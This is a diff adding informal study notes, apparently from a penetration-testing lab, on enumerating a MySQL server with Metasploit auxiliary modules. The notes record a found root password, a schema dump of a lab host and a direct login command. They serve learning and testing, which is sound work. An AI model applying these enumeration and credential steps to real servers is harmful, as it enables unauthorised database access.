@@ -1,0 +1,43 @@
+My sql is open source relational database Managemnet based on SQL
+Port not:3306 TCP Port
+
+auxiliary/scanner/mysql/mysql_version 
+192.87.149.3:3306 - 192.87.149.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
+Always try to login
+root:twinkle
+i find the credentials
+root:twinkle
+
+The modules under admin needs credentials
+auxiliary/admin/mysql/mysql_enum
+enumeration: remember sql is case sensitive
+
+auxiliary/admin/mysql/mysql_sql
+set sql show databases; //we can set querys for the mysql_sql
+we can enumerate as much as possible
+
+auxiliary/scanner/mysql/mysql_schemadump //it shows all the databases schema that fall under the databases
+
+msf6 auxiliary(scanner/mysql/mysql_schemadump) > run
+
+[+] 192.87.149.3:3306 - Schema stored in: /root/.msf4/loot/20260228172708_mysqlenum_192.87.149.3_mysql_schema_620165.txt
+[+] 192.87.149.3:3306 - MySQL Server Schema 
+ Host: 192.87.149.3 
+ Port: 3306 
+ ====================
+
+---
+- DBName: upload
+  Tables: []
+- DBName: vendors
+  Tables: []
+- DBName: videos
+  Tables: []
+- DBName: warehouse
+  Tables: []
+
+if we type creds -get credentials
+loot - will give where the creds are stored
+ mysql -h <target_ip> -u root -p
+we get mysql
+
